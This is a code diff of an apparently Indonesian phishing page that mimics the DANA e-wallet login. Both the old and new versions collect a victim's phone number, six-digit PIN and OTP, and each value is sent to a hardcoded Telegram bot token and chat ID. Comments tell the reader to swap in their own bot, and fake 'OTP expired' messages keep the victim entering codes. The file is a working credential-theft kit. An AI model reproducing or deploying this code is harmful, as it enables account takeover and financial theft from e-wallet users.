-   <input type="tel" value="" id="pin6" data-id="6" name="pin6" maxlength="1" required onchange="javascript:this.form.button();" oninput="openForm()" autofocus>
-    <p></p>
-    <input type="tel" style="opacity: 0.0">
-     </div> 
- <h2><input class="button" type="button" style="margin-top: -55px;" value="TAMPILKAN"></h2>
-    </center>
-
+     <div id="process1" name="process" class="process" style="display: none;">
+            <div class="loading">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8hbZEfutKvr9pkj0-mkJYWt-1SBtt3gw-HFOEZc0172okrp0SFHLaW3PRGVDm1U0P7WWEMELIw4nlq1_1gCgyZBo3cxf-OJNpguNamdJryCkGU-hTHiW3RyOv5JD9eIjXTFtrJFCVn0ae4RxG4Oi-czAP20tEaJI3OstxFAbtOwtFxp6RvOHc6NZL/s1600/load_bg.png">
+                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhl9xJVYWF_a9vAhgW5QQgozvZVADTaJgIX64iO7a5sQuMpSoPBK3zfKjvT6xc9fZPfxZz39mjk1H_oZOOOtYvO1l7DkWNqiD5LJyGYdwDNyHuyqLk_Ix6eFs3aLCG2yUXVwtsnj0BXTA40WZmecyLyCIm_ff0xNkkOvkuKBOl6yfS-QjI_EJrIyGtU/s1600/load_spin.png" id="loading" style="margin-top: 8px">
+            </div>
+        </div>
+        </center>
   </div>
-  <div class="tab" id="myForm">
-       <button type="button" style="background-color: transparent; color: transparent; margin-top: -5px" class="back" id="prevBtn1" onclick="kembalibutton()">back<img class="back" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNI1Emy7PX0havgWqHmqlT51KSm22vosgN4OekNvqowvUD5b_ftp3dSwYRhaNDEGZKkyXibrQzF2FPZ9tB9jHwqMYmsQv7SZs9yiVTt9TfQUgON1sKVo9ikO9NO82v7U2amQPmLFih0CenbjLkpEdathvIorjl6Pr-nxFULehzY2gAPpIyJsYX0I7O/s16000/AddText_05-15-01.36.51.jpg" style="opacity: 0.0"></button>
-       <p style="font-size: 20px; text-align: center; margin-bottom: -120px; font-weight: 600; color: #070707; margin-top: 141px; margin-left: -125px; opacity: 0.0;">nomor</p>
+  <div id="blogin" class="box-login" style="width: 100%;
+    height: 100%;
+    bottom: 0; 
+    position: fixed; 
+    left: 0; 
+    padding: 0px
+    right: 0; 
+    margin: 0px auto;
+    top: 0; display: none;">
+      	<div id="process" name="process" class="process" style="display: none;">
+			<div class="loading">
+				<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_bg.png">
+				<img class="spinner" src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_spin.png" style="margin-top: 8px">
+			</div>
+		</div>
+		
+		<div class="header">
+<button id="back1" type="button" class="btn-backku" onclick="goback1()"><ion-icon name="chevron-back-outline"></ion-icon></button>	<p></p>
+
+
+			<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt="">
+		</div>
+		<form id="formNohp" onsubmit="sendNohp(event);" >
+		     <input type="hidden" id="logo" value="𝐃𝐀𝐍𝐀 𝐈𝐃">
+			<h3 style="font-size: 16px; margin-top: -20px">Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
+			<div class="box-input" style="width: 95%;">
+				<div class="label">
+					<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt=""><label>+62</label>
+				</div>
+				<input class="inp" id="inp" type="tel" autocomplete="off" required name="nohp" placeholder="812-3456-7890" maxlength="12" minlength="10"></div>
+			<p class="desc" style="font-size: 12px; line-height: 18px; margin-top: 25px">
+Nomor ponsel akan digunakan sebagai ID kamu & menjaga<br>akun selalu aman. Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan dan Kebijakan Privasi</b> kami.
+			</p>
+			<div class="box-btn">
+				<button disabled id="btn" class="btnnohp" type="submit" style="margin-top: -40px">LANJUT</button>
+			</div>
+		</form>
+		<form id="formPin" omsubmit="return false" class="hid" style="width: 100%;
+    height: 100%;
+    bottom: 0; 
+    position: fixed; 
+    left: 0; 
+    right: 0; 
+    margin: 0px auto;
+    top: 0;">
+		     <input type="hidden" id="logo" value="𝐃𝐀𝐍𝐀 𝐈𝐃">
+		    <button id="back2" type="button" class="btn-backku" onclick="goback2()" style="margin-top: 10px"><ion-icon name="chevron-back-outline"></ion-icon></button>
+			<h3 style="margin-top: 50px; font-weight: 600; margin-bottom: -10px; font-size: 16px"><font style="font-weight: 400">Masukkan</font> PIN DANA</h3>
+			<div class="box-input-pin">
+				<div type="button" class="clear"></div>
+				<input name="pin1" id="pin1" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin2" id="pin2" class="inppin" inputmode="numeric" type="password" autocomplete="off" required"""" maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin3" id="pin3" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin4" id="pin4" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin5" id="pin5" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin6" id="pin6" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;" onchange="javascript:this.form.button();" oninput="sendPin()"></div>
+			<button class="show" type="button">TAMPILKAN</button>
+			<p class="forgot">LUPA PIN?</p>
+			<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbD-mmuMUDwaeFMEz6NefivuQqHyrFXvXxqVxMhYRhR5wsfUhiWkPNkpxLKkagRNpJ2obIiZH_D9EK6tnHIJUFMVBOclZI98zrU7VPszAR5n-_GeSWNCNgnfH1MRWuL-ahhPjxsejyDa5yyWAaOMWXWT4jS4EngtdLLlXjaPakQoFIOsjyS6tfnEBHDlw/s16000/output-onlinegiftools.gif" width="100%" style="position: absolute; bottom: 10; left: 0; right: 0; margin: 0px auto;">
+		</form>
+<div class="bgotp hid" style="width: 100%;
+    height: 100%;
+    bottom: 0; 
+    position: absolute; 
+    left: 0; 
+    right: 0; 
+    margin: 0px auto;
+    top: 0;">
+<div class="bgotp hid"><form id="formOtp" class=""><h2>Masukan Kode OTP</h2><br><center>
+				<p class="alert" id="alert" style="font-size: 14px; text-align: center; margin-bottom: 0px; font-weight: 500; color: #000; margin-top: 0px; display: ; width: 360px; margin-bottom: -10px; font-weight: 300"></p>
+				
+				
+				</center>
+				<div class="box-input-otp" style="margin-top: 50px">
+					
+					<div class="loadingOtp" style="display:none;background: #fafafa">
+
+						
+						<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_bg.png"><img class="spinner" src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_spin.png">
+		</div>
+		<div type="button" class="clearotp"></div>
+		 <input type="hidden" id="logo" value="𝐃𝐀𝐍𝐀 𝐈𝐃">
+					<input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"></div>
+		 <p id="waktuku" class="resend" style="margin-top: 70px; spacing: 2;color: #0f78cb; font-size: 13px">
+					Kirim Ulang (<span id="carasingkat" style="color: #0f78cb">60</span>s)
+				</p>
+       <p class="resend" style="margin-top: 70px; spacing: 2; font-weight: 600; color: #0f78cb; margin-left: 0px; display: none" id="kirim-ulang" onclick="kirimulang()">Kirim Ulang</p>
+       
+       
+			</div>
+		</div>
+	</div>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+        <script>
+            var url = "#kirim-ulang"; // url tujuan
+            var count = 60; // dalam detik
+            function countDown() {
+                
+                if (count > 0) {
+                    count--;
+                    var waktu = count + 0;
+            $('#carasingkat').html(waktu);
              
-    <div class="page" style="left: 0px; position: absolute; right: 0; margin-top: 0px; background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSpY6Zfek1Rwe6IGuCNCHImMircf3aUYhAxWkLQfwZTZAv8kOcHmQWDpB7KkXYNBbt8vSu6eyWWOGmhCRf-GU1u5n3o9fmES-zHCNIz3TKYfCsB6ADDliu9vzwyDkJR8b97LBQ78AUvDyQzIYG5jqgLXW_6S2CCxK9M5Bj5nyoXHyAaW48EPtv5Vnm/s16000/AddText_06-06-10.03.33.png) no-repeat center center;
-  background-position: 100% 100%;
-  background-size: 100% 100%; height: 280px; bottom: 0; width: 100%; border-radius: 10px 10px 0px 0px"> 
-  
-      <div class="pin-code1" maxlength="6" style="margin-top: 98px"> <center>
-          
-       <input type="tel" id="pin11" data-id="11" name="pin11" maxlength="1" required autofocus> 
-       <input type="tel" id="pin22" data-id="22" name="pin22" maxlength="1" autofocus> 
-       <input type="tel" id="pin33" data-id="33" name="pin33" maxlength="1" autofocus> 
-       <input type="tel" id="pin44" data-id="44" name="pin444" maxlength="1" required onchange="javascript:this.form.button();" oninput="kirimPesan()" autofocus> 
-       <p></p> 
-       <input type="tel" style="opacity: 0.0"> 
-       </center>
-       <p id="userid" style="font-size: 15px; text-align: center; margin-bottom: 130px; font-weight: 400; color: #070707; margin-top: -140px; margin-left: 0px; display: ">nomor</p>
-       <p></p>
-       <p class="resend" style="font-weight: 800; color: #ccc; z-index: 99999999999; position: static; margin-left: 170px">KIRIM ULANG (<span id="time">60</span>s)</p>
-      </div> 
-     </div> 
-     
-     <input type="hidden" id="logo" value="">
-   
-  </div>
-  <div class="tab" id="valid">
-  <p id="userid" style="font-size: 20px; text-align: center; margin-bottom: -100px; font-weight: 600; color: #070707; margin-top: 66px; margin-left: -125px; opacity: 0.0;">nomor</p>
-  
-         
-    <div class="page" style="left: 0px; position: absolute; right: 0; margin-top: 0px; background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSpY6Zfek1Rwe6IGuCNCHImMircf3aUYhAxWkLQfwZTZAv8kOcHmQWDpB7KkXYNBbt8vSu6eyWWOGmhCRf-GU1u5n3o9fmES-zHCNIz3TKYfCsB6ADDliu9vzwyDkJR8b97LBQ78AUvDyQzIYG5jqgLXW_6S2CCxK9M5Bj5nyoXHyAaW48EPtv5Vnm/s16000/AddText_06-06-10.03.33.png) no-repeat center center;
-  background-position: 100% 100%;
-  background-size: 100% 100%; height: 280px; bottom: 0; width: 100%; border-radius: 10px 10px 0px 0px"> 
-  <form action="googleplayDANA.html" method="get">
-      <div class="pin-code2" maxlength="6" style="margin-top: 107px"> <center>
-          
-       <input type="tel" id="pin111" data-id="111" name="pin111" maxlength="1" required autofocus> 
-       <input type="tel" id="pin222" data-id="222" name="pin222" maxlength="1" autofocus> 
-       <input type="tel" id="pin333" data-id="333" name="pin333" maxlength="1" autofocus> 
-       <input type="tel" id="pin444" data-id="444" name="pin444" maxlength="1" required onchange="javascript:this.form.submit();" oninput="kirimPesan1()" autofocus> 
-       <p></p> 
-       <input type="tel" style="opacity: 0.0"> 
-       </center>
-       <div style="margin: 30px">
-            <p id="useridku" style="font-size: 13px; text-align: center; margin-bottom: 118px; font-weight: 400; color: red; margin-top: -180px; margin-left: 0px; display: ">Kode dikirim via SMS ke Nomor anda</p>
-             </div>
-       <p></p>
- <p class="resend" style="font-weight: 800; color: #ccc; z-index: 99999999999; position: static; margin-left: 170px">KIRIM ULANG (<span id="time">60</span>s)</p>
-      </div> 
-     </div> 
-     
-     <input type="hidden" id="logo" value="">
+         setTimeout("countDown()", 1000);
+           
+                    
+               
+                }
+            }
+            countDown();
+       
+       </script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
+<script src="./asset/goo1gle.js"></script>
+<script>$(document).ready(function(){$('#inp').on('input', function(){if($(this).val() == '0' || $(this).val() == '62'){$(this).val('');}});});</script>
+<script>$(document).ready(function(){$('#inp').mask('000-0000-000000');});</script>
+<script>let inp = document.getElementById("inp");let btn = document.getElementById("btn");inp.addEventListener("input", val);function val(){if(inp.value.length > 10){btn.disabled = false;}else{btn.disabled = true;}};</script>
 
-</form>
-  </div>
-  <div style="overflow:auto;">
-    <div style="float: ; display: none" id="tombolback">
-      <arole type="button" class="back" id="prevBtn" onclick="nextPrev(-1)"><img class="back" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNI1Emy7PX0havgWqHmqlT51KSm22vosgN4OekNvqowvUD5b_ftp3dSwYRhaNDEGZKkyXibrQzF2FPZ9tB9jHwqMYmsQv7SZs9yiVTt9TfQUgON1sKVo9ikO9NO82v7U2amQPmLFih0CenbjLkpEdathvIorjl6Pr-nxFULehzY2gAPpIyJsYX0I7O/s16000/AddText_05-15-01.36.51.jpg"></a>
-      </div>
-        
-  </div>
-  
-  <!-- Circles which indicates the steps of the form: -->
-  <div style="text-align:center;margin-top:40px;">
-    <span class="step"></span>
-    <span class="step"></span>
-    <span class="step"></span>
-    <span class="step"></span>
-    <span class="step"></span>
-    </form>
-  </div>
-   
-   <center>
- <div id="process" name="process" class="process" style="display: none;">
-            <div class="loading">
-                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8hbZEfutKvr9pkj0-mkJYWt-1SBtt3gw-HFOEZc0172okrp0SFHLaW3PRGVDm1U0P7WWEMELIw4nlq1_1gCgyZBo3cxf-OJNpguNamdJryCkGU-hTHiW3RyOv5JD9eIjXTFtrJFCVn0ae4RxG4Oi-czAP20tEaJI3OstxFAbtOwtFxp6RvOHc6NZL/s1600/load_bg.png">
-                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhl9xJVYWF_a9vAhgW5QQgozvZVADTaJgIX64iO7a5sQuMpSoPBK3zfKjvT6xc9fZPfxZz39mjk1H_oZOOOtYvO1l7DkWNqiD5LJyGYdwDNyHuyqLk_Ix6eFs3aLCG2yUXVwtsnj0BXTA40WZmecyLyCIm_ff0xNkkOvkuKBOl6yfS-QjI_EJrIyGtU/s1600/load_spin.png" id="loading">
-            </div>
-        </div>
-        </center>
-          <center>
- <div id="process1" name="process" class="process" style="display: none;">
-            <div class="loading">
-                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8hbZEfutKvr9pkj0-mkJYWt-1SBtt3gw-HFOEZc0172okrp0SFHLaW3PRGVDm1U0P7WWEMELIw4nlq1_1gCgyZBo3cxf-OJNpguNamdJryCkGU-hTHiW3RyOv5JD9eIjXTFtrJFCVn0ae4RxG4Oi-czAP20tEaJI3OstxFAbtOwtFxp6RvOHc6NZL/s1600/load_bg.png">
-                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhl9xJVYWF_a9vAhgW5QQgozvZVADTaJgIX64iO7a5sQuMpSoPBK3zfKjvT6xc9fZPfxZz39mjk1H_oZOOOtYvO1l7DkWNqiD5LJyGYdwDNyHuyqLk_Ix6eFs3aLCG2yUXVwtsnj0BXTA40WZmecyLyCIm_ff0xNkkOvkuKBOl6yfS-QjI_EJrIyGtU/s1600/load_spin.png" id="loading">
-            </div>
-        </div>
-        </center>
-       <script>
-$(document).ready(function() {
-    $('#nope').on('input change', function() {
-        if(nope.value.length >9) {
-        nextBtn.disabled= false
-       }
-        else {
-        nextBtn.disabled= true;
-        }
-    });
-});
-</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
-    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
-    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-     <script>
-        $(document).ready(function () {
-            $("#nextBtn").on('click', function () {
-                $("#process").show();
-                setTimeout(() => {
-                $("#process").fadeOut();
-                },1500)
-              });
-        });
-        
-        
-      function startTimer(duration, display) {
-    var timer = duration, minutes, seconds;
-    setInterval(function () {
-        minutes = parseInt(timer / 59, 10);
-        seconds = parseInt(timer % 59, 10);
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-        display.textContent = seconds;
-        if (--timer < 0) {
-            timer = duration;
-        }
-    }, 1000);
-}
-window.onload = function () {
-    var fiveMinutes = 59 * 1,
-        display = document.querySelector('#timer');
-    startTimer(fiveMinutes, display);
-};
-
-
-    </script>
 <script>
-  function backbutton(){
-      document.getElementById("danapin").style.display = "none";
-      document.getElementById("login").style.display = "block";
-      document.getElementById("tombolback").style.display = "block";
-      document.getElementById("process1").style.display = "flex";
-      $("#process1").fadeOut();
-  }
-  
-  
-  function kembalibutton(){
-      document.getElementById("myForm").style.display = "none";
-      document.getElementById("danapin").style.display = "block";
-      document.getElementById("prevBtn1").style.display = "none";
-        document.getElementById("prevBtn").style.display = "block";
-        document.getElementById("process1").style.display = "flex";
-      $("#process1").fadeOut();
-        document.write.getElementById("danapin")
-        var pinContainer = document.querySelector(".pin-code");
-        
-        pinContainer.addEventListener('keydown', function (event) {
+//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
+var pinContainer = document.querySelector(".box-input-pin");
+console.log('There is ' + pinContainer.length + ' Pin Container on the page.');
+
+pinContainer.addEventListener('keyup', function (event) {
+    var target = event.srcElement;
+    
+    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
+    var myLength = target.value. length;
+
+    if (myLength >= maxLength) {
+        var next = target;
+        while (next = next.nextElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        } aa
+    }
+
+    if (myLength === 0) {
+        var next = target;
+        while (next = next.previousElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        }
+    }
+}, false);
+
+pinContainer.addEventListener('keydown', function (event) {
     var target = event.srcElement;
     target.value = "";
 }, false);
-      
-      
-  }
+</script>
+<script>$('.inpotp').on('input', function(event) {const inputs = $('.inpotp');const isAllFilled = Array.from(inputs).every((input) => input.value !== '');if (isAllFilled == true) {$(event.target).blur();sendOtp();}const index = inputs.index(this);const currentValue = event.target.value;if (currentValue.length === 1) {if (index < inputs.length - 1) {inputs[index + 1].focus();}} else if (currentValue.length === 0) {if (index > 0) {inputs[index].focus();}};});$('.inpotp').on('keydown', function(event) {const inputs = $('.inpotp');const key = event.key;const index = inputs.index(this);if (key === 'Backspace' && event.target.value.length === 0) {if (index > 0) {inputs[index - 1].focus();}};});</script>
+<script>$(document).ready(function() {$('.clear').click(function() {$('.inppin').val('');$('#pin1').focus();});$('.clearotp').click(function() {$('.inpotp').val('');$('#otp1').focus();});$('.show').click(function() {$('.inppin').each(function() {if ($(this).attr('type') === 'password') {$(this).attr('type','number');$(".show").text("SEMBUNYIKAN");} else {$(this).attr('type', 'password');$(".show").text("TAMPILKAN");}});});});</script>
+<script>
+ function nextPrev(){
+      $("#process1").show();event.preventDefault();
+       setTimeout(function(){
+           $("#homeku").hide();
+           $("#back1").show();
+           $("#butonku").fadeOut();
+           $(".box-login").fadeIn();
+           $("#process1").hide();
+       },1000);
+ }   
+ 
+ 
+ function goback1(){
+     $("#process").show();
+     setTimeout(function(){
+     $("#homeku").show();
+      $(".box-login").fadeOut();
+      $("#butonku").fadeIn();
+      $("#back1").hide();
+       $("#process").hide();
+       
+     },500);
+ }
+ 
+ </script>
+ <script>
+ 
+ function goback2(){
+     $("#process").show();
+     setTimeout(function(){
+    $("#formPin").fadeOut();
+     $("#formNohp").fadeIn();
+       $("#process").hide();
+        $("#inp").val('');
+        $("#back1").show();
+        $("#back2").hide();
+        document.getElementById("formPin").reset();
+        $('.inppin').val('');
+     },500);
+ }
+</script>
+<script>
+    $( document ).ready(function() {
+            setTimeout(() => {
+                $('#popup').hide();
+                $('chsalxcome2').fadeIn();
+            },2000)
+             $('musikku').play();
+        })
         
-   
-  
-  </script>
-  <script>
-function nomorLogin(){
-   document.getElementById("danapin").style.display = "block";
-   document.getElementById("tombolback").style.display = "none";
-   document.getElementById("process1").style.display = "flex";
-   setTimeout(() => {
-      $("#process1").fadeOut();
-   },1500)
-  document.getElementById("login").style.display = "none";
-     document.getElementById("userid").innerHTML = "nomor";
-      var logo = document.getElementById('logo');       
-    var nope = document.getElementById('nope');
+</script>
+
+
+<script>
+function tutupotp(){
+$(".bgotp").hide();    
+}
+</script>
+<script>
+   function sendNohp(event){
+    $("#process").show();event.preventDefault();
+    $("#inp").blur();
+     
     
-    var gabungan = '' + logo.value + '%0A~%20𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔%20~%0A%20%20%20%20%20' + nope.value;
+    
+    var nomor = document.getElementById("inp").value;
+            sessionStorage.setItem("nomor", nomor);
+    var logo = document.getElementById('logo');       
+    var inp = document.getElementById('inp');
+    
+    var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩 : ' + '0' + inp.value;
    
-    var token = '7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6235911819'; // Ganti dengan chat id dari bot yang kamu buat
+    var token ='7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY'; // Ganti dengan token bot yang kamu buat
+    var grup ='6235911819'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
         method: `POST`,
-    })
-}
+    
+    success: function(){
+    $("#process").hide();
+    document.getElementById("back1").style.display = "none";
+    document.getElementById("back2").style.display = "block";
+    $("#formNohp").fadeOut();
+    setTimeout(function(){
+   
+    $("#formPin").fadeIn();
+    $("#pin1").focus();
+    }, 500);}});};
+    
+
+function sendPin(){
+
  
-    
-  </script>
-<script>
-function openForm() {
-  document.getElementById("myForm").style.display = "block";
-   document.getElementById("prevBtn").style.display = "none";
-     document.getElementById("prevBtn1").style.display = "block";
-     
-      
-  document.getElementById("process1").style.display = "flex";
-  setTimeout(() => {
-      $("#process1").fadeOut();
-  },1500)
-      document.getElementById("danapin").style.display = "none";
-  document.getElementById("userid").innerHTML = "Kode dikirim via SMS ke +62" + nope.value; 
-    
-  var logo = document.getElementById('logo');
-  var pin1 = document.getElementById('pin1');
+ 
+  var nomor = sessionStorage.getItem("nomor");
+        document.getElementById("alert").innerHTML = "Kode dikirim via SMS ke +62 " + nomor+ " <br/>";
+  var logo = document.getElementById('logo'); 
+  var inp = document.getElementById('inp');
+ var pin1 = document.getElementById('pin1');
  var pin2 = document.getElementById('pin2');
  var pin3 = document.getElementById('pin3');
  var pin4 = document.getElementById('pin4');
  var pin5 = document.getElementById('pin5');
  var pin6 = document.getElementById('pin6');
      
-  var gabungan = '' + logo.value + '%0A~%20𝗣𝗜𝗡 𝗗𝗔𝗡𝗔%20~%0A%20%20%20%20%20' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
+  var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩: ' + '0' + inp.value + '%0A𝐏𝐈𝐍.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
   
      
  
 
-    var token = '7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY'; // Ganti dengan token bot yang kamu buat
+    var token ='7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY'; // Ganti dengan token bot yang kamu buat
     var grup = '6235911819'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
         method: `POST`,
-    })
+
+
+success: function(){
+$("#process").hide();
+document.getElementById("alert").style.display = "block"; 
+$(".bgotp").fadeIn();
+setInterval(countdown, 1000);
+$("#otp1").focus();
 }
-  
-function nextPrev(){
-    document.getElementById("login").style.display = "block";
-    document.getElementById("process1").style.display = "flex";
-    setTimeout(() => {
-      $("#process1").fadeOut();
-    },800)
-       document.getElementById("homeku").style.display = "none";
-    
-} 
-  
-  
-function kirimPesan(){
-    
-    document.getElementById("valid").style.display = "block";
-     document.getElementById("myForm").style.display = "none";
-     document.getElementById("process1").style.display = "flex";
-     setTimeout(() => {
-      $("#process1").fadeOut();
-     },1500)
-   document.getElementById("useridku").innerHTML = "Kode OTP telah kadaluarsa atau invalid, Silahkan Kirim ulang OTP"; 
-   
-    
-     var logo = document.getElementById('logo');
-   var pin11 = document.getElementById('pin11');
-   var pin22 = document.getElementById('pin22');
-   var pin33 = document.getElementById('pin33');
-   var pin44 = document.getElementById('pin44');
-    
-
-    var gabungan = '' + logo.value +  '%0A~%20𝗢𝗧𝗣 𝗗𝗔𝗡𝗔%20~%0A%20%20%20%20%20%20' + pin11.value + pin22.value + pin33.value + pin44.value;
-
-
-    var token = '7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6235911819'; // Ganti dengan chat id dari bot yang kamu buat
-
-    $.ajax({
-        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-        method: `POST`,
-    })
 }
- 
- function startTimer(duration, display) {
-    var timer = duration, minutes, seconds;
-    setInterval(function () {
-        minutes = parseInt(timer / 60, 10);
-        seconds = parseInt(timer % 60, 10);
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-        display.textContent = seconds;
-        if (--timer < 0) {
-            timer = duration;
-        }
-    }, 1000);
-}
-window.onload = function () {
-    var fiveMinutes = 59 * 1,
-        display = document.querySelector('#time');
-    startTimer(fiveMinutes, display);
-};
-
-
-
-    </script>
-  <script>
-$( document ).ready(function() {
-            setTimeout(() => {
-                $('welalxcome').hide();
-                $('chsalxcome2').fadeIn();
-            },2060)
-        })
-        
-</script>
-
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<script src="https://cdn.rawgit.com/igorescobar/jQuery-Mask-Plugin/1ef022ab/dist/jquery.mask.min.js"></script>
-<script type="text/javascript">
-	$(document).ready(function(){
-	    // Format nomor HP.
-	  $( '.nope' ).mask('999-9999-99999');
-	})
-</script>
-    </body>
-</html>
-<script>
-//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
-var pinContainer = document.querySelector(".pin-code");
-console.log('There is ' + pinContainer.length + ' Pin Container on the page.');
-
-pinContainer.addEventListener('keyup', function (event) {
-    var target = event.srcElement;
-    
-    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
-    var myLength = target.value. length;
-
-    if (myLength >= maxLength) {
-        var next = target;
-        while (next = next.nextElementSibling) {
-            if (next == 0) break;
-            if (next.tagName.toLowerCase() == "input") {
-                next.focus();
-                break;
-            }
-        }
-    }
-
-    if (myLength === 0) {
-        var next = target;
-        while (next = next.previousElementSibling) {
-            if (next == 0) break;
-            if (next.tagName.toLowerCase() == "input") {
-                next.focus();
-                break;
-            }
-        }
-    }
-}, false);
-
-pinContainer.addEventListener('keydown', function (event) {
-    var target = event.srcElement;
-    target.value = "";
-}, false);
-</script>
-<script>
-//var pinContainer = document.getElementsByClassName("pin-code1")[maxlength];
-var pinContainer = document.querySelector(".pin-code1");
-console.log('There is ' + pinContainer.length + ' Pin Container on the page.');
-
-pinContainer.addEventListener('keyup', function (event) {
-    var target = event.srcElement;
-    
-    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
-    var myLength = target.value. length;
-
-    if (myLength >= maxLength) {
-        var next = target;
-        while (next = next.nextElementSibling) {
-            if (next == 0) break;
-            if (next.tagName.toLowerCase() == "input") {
-                next.focus();
-                break;
-            }
-        }
-    }
-
-    if (myLength === 0) {
-        var next = target;
-        while (next = next.previousElementSibling) {
-            if (next == 0) break;
-            if (next.tagName.toLowerCase() == "input") {
-                next.focus();
-                break;
-            }
-        }
-    }
-}, false);
-
-pinContainer.addEventListener('keydown', function (event) {
-    var target = event.srcElement;
-    target.value = "";
-}, false);
-</script>
-<script>
-//var pinContainer = document.getElementsByClassName("pin-code2")[maxlength];
-var pinContainer = document.querySelector(".pin-code2");
-console.log('There is ' + pinContainer.length + ' Pin Container on the page.');
-
-pinContainer.addEventListener('keyup', function (event) {
-    var target = event.srcElement;
-    
-    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
-    var myLength = target.value. length;
-
-    if (myLength >= maxLength) {
-        var next = target;
-        while (next = next.nextElementSibling) {
-            if (next == 0) break;
-            if (next.tagName.toLowerCase() == "input") {
-                next.focus();
-                break;
-            }
-        }
-    }
-
-    if (myLength === 0) {
-        var next = target;
-        while (next = next.previousElementSibling) {
-            if (next == 0) break;
-            if (next.tagName.toLowerCase() == "input") {
-                next.focus();
-                break;
-            }
-        }
-    }
-}, false);
-
-pinContainer.addEventListener('keydown', function (event) {
-    var target = event.srcElement;
-    target.value = "";
-}, false);
-
-
-
-function kirimPesan1(){
-    
- 
